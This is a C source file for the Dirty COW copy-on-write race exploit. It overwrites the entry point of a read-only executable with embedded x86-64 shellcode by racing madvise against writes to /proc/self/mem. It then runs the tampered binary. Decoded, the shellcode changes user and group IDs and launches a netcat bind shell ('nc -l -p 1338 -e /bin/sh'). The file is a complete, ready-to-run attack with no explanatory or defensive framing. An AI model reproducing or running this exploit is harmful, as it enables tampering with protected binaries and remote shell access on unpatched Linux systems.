#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/uio.h>
#include <sys/wait.h>

void *map;

char *name;
int die = 0;
int success = 0;
long offset;
long page_x;

#ifdef __x86_64__
#define SHELL_SIZE 187
#define BASE_OFF 0x1160     // == entrypoint i moveloot
char orig_buf[SHELL_SIZE];
char shelcode[SHELL_SIZE] = "\x48\x31\xC0\x48\xC7\xC7\xE9\x03\x00\x00\x48\xC7\xC6\xE9\x03\x00\x00\xB0\x71\x0F\x05\x48\xC7\xC7\x64\x00\x00\x00\x48\xC7\xC6\x64\x00\x00\x00\xB0\x72\x0F\x05\x48\x31\xD2\x48\xBF\xFF\xFF\xFF\xFF\xFF\x2F\x6E\x63\x48\xC1\xEF\x28\x57\x48\xBF\x2F\x75\x73\x72\x2F\x62\x69\x6E\x57\x48\x89\xE7\x48\xB9\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xE9\x08\x51\x48\x89\xE1\x48\xBB\xFF\xFF\xFF\xFF\xFF\xFF\x2D\x65\x48\xC1\xEB\x30\x53\x48\x89\xE3\x49\xBA\xFF\xFF\xFF\xFF\x31\x33\x33\x38\x49\xC1\xEA\x20\x41\x52\x49\x89\xE2\x49\xB9\xFF\xFF\xFF\xFF\xFF\xFF\x2D\x70\x49\xC1\xE9\x30\x41\x51\x49\x89\xE1\x49\xB8\xFF\xFF\xFF\xFF\xFF\xFF\x2D\x6C\x49\xC1\xE8\x30\x41\x50\x49\x89\xE0\x52\x51\x53\x41\x52\x41\x51\x41\x50\x57\x48\x89\xE6\x48\x31\xC0\xB0\x3B\x0F\x05\x90\x90\x90";
#else
#error "unsuported"
#endif

char *write_ptr = shelcode;
char *orig_ptr  = orig_buf;

void *trigger(void *arg)
{

  int i,c=0;
  for(i=0;i<100000000 && !die ;i++)
  {
    c+=madvise(map,offset+SHELL_SIZE,MADV_DONTNEED);
    if(die) break;
  }
  //  printf("madvise %d\n",c);
}
 
void *overwrite(void *arg)
{
  
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000 && !die;i++) {
    lseek(f,(long)map+offset,SEEK_SET);
    c+=write(f,write_ptr,SHELL_SIZE);
  }
  //  printf("procselfmem %d\n", c);
}
 
void * checker(void *arg){
  
  int i,f;
  char buf[SHELL_SIZE];
  for(i=0;i<100000000;i++) {
    f=open(name,O_RDONLY);
    lseek(f,offset+page_x,SEEK_SET);
    memset(buf,0,SHELL_SIZE);
    read(f,buf,SHELL_SIZE);
    close(f);
    
    if(memcmp(buf,orig_ptr,SHELL_SIZE)){
      die=1;
      success=1;
      break;
    }
  }
}
void worker(char *p0,char *p1){
  pthread_t pth1,pth2,pth3;

  write_ptr = p0;
  orig_ptr  = p1;

  int f=open(name,O_RDONLY);
  map=mmap(NULL,0x1000,PROT_READ,MAP_PRIVATE,f,page_x);

  
  pthread_create(&pth2,NULL,overwrite,NULL);
  
  pthread_create(&pth1,NULL,trigger,NULL);
  pthread_create(&pth3,NULL,checker,NULL);

  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  pthread_join(pth3,NULL);
  munmap(map,0x1000); 
  close(f);
}

int main(int argc,char *argv[])
{
  int type = 0,f;
   
  if (argc<2)return 1;
  name = argv[1];
     
  f=open(name,O_RDONLY);
  lseek(f,0x10,0);
  read(f,&type,2);

  lseek(f,0x18,0);
  read(f,&offset,8);
  if(type == 2)   offset -= BASE_OFF;
  
  lseek(f,offset,0);
  read(f,orig_buf,sizeof(orig_buf));
  close(f);
  
  page_x = offset & ~0xfff;
  offset -= page_x;
//  printf("%llx %llx\n",page_x,offset);
  puts("[*] let make some c0ws dirty");
       
  worker(shelcode,orig_buf);
  if(success) {
    puts("[+] ok we have some dirty things going on");
    if(!fork()) { 
      execve(argv[1],0,0);
    }
    //wait(NULL);
    //puts("[*] let's clean up...");
    //die = 0;
    //worker(orig_buf,shelcode);
    
  }
	 		 
  return 0;
}
